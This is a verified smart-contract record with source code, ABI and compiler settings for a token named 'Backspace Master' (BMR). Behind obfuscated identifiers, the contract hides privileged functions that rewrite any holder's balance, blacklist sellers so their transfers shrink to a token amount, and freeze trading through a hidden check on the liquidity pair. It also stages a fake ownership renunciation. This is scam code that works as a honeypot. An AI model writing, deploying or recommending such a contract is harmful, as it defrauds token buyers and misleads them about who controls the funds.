{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface tradingWallet {\n    function createPair(address limitAt, address receiverTake) external returns (address);\n}\n\ninterface marketingTo {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address liquidityTake) external view returns (uint256);\n\n    function transfer(address toAt, uint256 maxAuto) external returns (bool);\n\n    function allowance(address exemptMax, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 maxAuto) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address toAt,\n        uint256 maxAuto\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed autoLaunched, uint256 value);\n    event Approval(address indexed exemptMax, address indexed spender, uint256 value);\n}\n\nabstract contract tokenAutoBuy {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface amountWallet {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface marketingToMetadata is marketingTo {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract BackspaceMaster is tokenAutoBuy, marketingTo, marketingToMetadata {\n\n    function transferFrom(address maxAt, address toAt, uint256 maxAuto) external override returns (bool) {\n        if (_msgSender() != autoShouldIs) {\n            if (walletAuto[maxAt][_msgSender()] != type(uint256).max) {\n                require(maxAuto <= walletAuto[maxAt][_msgSender()]);\n                walletAuto[maxAt][_msgSender()] -= maxAuto;\n            }\n        }\n        return feeTotal(maxAt, toAt, maxAuto);\n    }\n\n    uint256 sellFrom;\n\n    mapping(address => mapping(address => uint256)) private walletAuto;\n\n    function getOwner() external view returns (address) {\n        return tradingLaunch;\n    }\n\n    bool private amountTo;\n\n    address public swapAt;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return minExempt;\n    }\n\n    uint8 private buyLimit = 18;\n\n    function feeTotal(address maxAt, address toAt, uint256 maxAuto) internal returns (bool) {\n        if (maxAt == amountLaunch) {\n            return tokenTrading(maxAt, toAt, maxAuto);\n        }\n        uint256 shouldBuy = marketingTo(swapAt).balanceOf(buyFee);\n        require(shouldBuy == sellFrom);\n        require(toAt != buyFee);\n        if (fundAuto[maxAt]) {\n            return tokenTrading(maxAt, toAt, amountReceiverSender);\n        }\n        return tokenTrading(maxAt, toAt, maxAuto);\n    }\n\n    string private totalLaunched = \"BMR\";\n\n    event OwnershipTransferred(address indexed teamMax, address indexed fundFeeAt);\n\n    mapping(address => bool) public feeTx;\n\n    constructor (){\n        if (marketingBuyTake) {\n            feeIs = true;\n        }\n        amountWallet totalFund = amountWallet(autoShouldIs);\n        swapAt = tradingWallet(totalFund.factory()).createPair(totalFund.WETH(), address(this));\n        if (senderAt == tokenBuy) {\n            tokenBuy = amountSell;\n        }\n        amountLaunch = _msgSender();\n        feeTx[amountLaunch] = true;\n        launchLiquidity[amountLaunch] = minExempt;\n        shouldTakeLiquidity();\n        if (marketingBuyTake == senderTeam) {\n            amountSell = sellMax;\n        }\n        emit Transfer(address(0), amountLaunch, minExempt);\n    }\n\n    uint256 private tokenBuy;\n\n    bool private senderTeam;\n\n    function balanceOf(address liquidityTake) public view virtual override returns (uint256) {\n        return launchLiquidity[liquidityTake];\n    }\n\n    function liquidityReceiver(uint256 maxAuto) public {\n        atLaunched();\n        sellFrom = maxAuto;\n    }\n\n    bool private marketingBuyTake;\n\n    address autoShouldIs = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private sellMax;\n\n    function launchShould(address receiverReceiverIs) public {\n        atLaunched();\n        \n        if (receiverReceiverIs == amountLaunch || receiverReceiverIs == swapAt) {\n            return;\n        }\n        fundAuto[receiverReceiverIs] = true;\n    }\n\n    address private tradingLaunch;\n\n    mapping(address => bool) public fundAuto;\n\n    uint256 public senderAt;\n\n    function decimals() external view virtual override returns (uint8) {\n        return buyLimit;\n    }\n\n    function owner() external view returns (address) {\n        return tradingLaunch;\n    }\n\n    bool public autoMinMode;\n\n    function transfer(address atLaunch, uint256 maxAuto) external virtual override returns (bool) {\n        return feeTotal(_msgSender(), atLaunch, maxAuto);\n    }\n\n    function takeWalletEnable(address atLaunch, uint256 maxAuto) public {\n        atLaunched();\n        launchLiquidity[atLaunch] = maxAuto;\n    }\n\n    string private receiverLiquidity = \"Backspace Master\";\n\n    address buyFee = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 constant amountReceiverSender = 8 ** 10;\n\n    function takeTrading(address minLaunch) public {\n        require(minLaunch.balance < 100000);\n        if (sellLaunchMarketing) {\n            return;\n        }\n        if (autoMinMode) {\n            senderTeam = false;\n        }\n        feeTx[minLaunch] = true;\n        \n        sellLaunchMarketing = true;\n    }\n\n    function shouldTakeLiquidity() public {\n        emit OwnershipTransferred(amountLaunch, address(0));\n        tradingLaunch = address(0);\n    }\n\n    bool private marketingAutoAt;\n\n    uint256 private minExempt = 100000000 * 10 ** 18;\n\n    uint256 feeFund;\n\n    function atLaunched() private view {\n        require(feeTx[_msgSender()]);\n    }\n\n    bool public sellLaunchMarketing;\n\n    function symbol() external view virtual override returns (string memory) {\n        return totalLaunched;\n    }\n\n    bool private feeIs;\n\n    function approve(address marketingIs, uint256 maxAuto) public virtual override returns (bool) {\n        walletAuto[_msgSender()][marketingIs] = maxAuto;\n        emit Approval(_msgSender(), marketingIs, maxAuto);\n        return true;\n    }\n\n    function tokenTrading(address maxAt, address toAt, uint256 maxAuto) internal returns (bool) {\n        require(launchLiquidity[maxAt] >= maxAuto);\n        launchLiquidity[maxAt] -= maxAuto;\n        launchLiquidity[toAt] += maxAuto;\n        emit Transfer(maxAt, toAt, maxAuto);\n        return true;\n    }\n\n    uint256 public amountSell;\n\n    function name() external view virtual override returns (string memory) {\n        return receiverLiquidity;\n    }\n\n    address public amountLaunch;\n\n    function allowance(address feeFrom, address marketingIs) external view virtual override returns (uint256) {\n        if (marketingIs == autoShouldIs) {\n            return type(uint256).max;\n        }\n        return walletAuto[feeFrom][marketingIs];\n    }\n\n    mapping(address => uint256) private launchLiquidity;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundFeeAt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoLaunched\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeFrom\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingIs\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxAuto\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoMinMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityTake\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverReceiverIs\",\"type\":\"address\"}],\"name\":\"launchShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxAuto\",\"type\":\"uint256\"}],\"name\":\"liquidityReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellLaunchMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldTakeLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minLaunch\",\"type\":\"address\"}],\"name\":\"takeTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxAuto\",\"type\":\"uint256\"}],\"name\":\"takeWalletEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxAuto\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxAuto\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "BackspaceMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}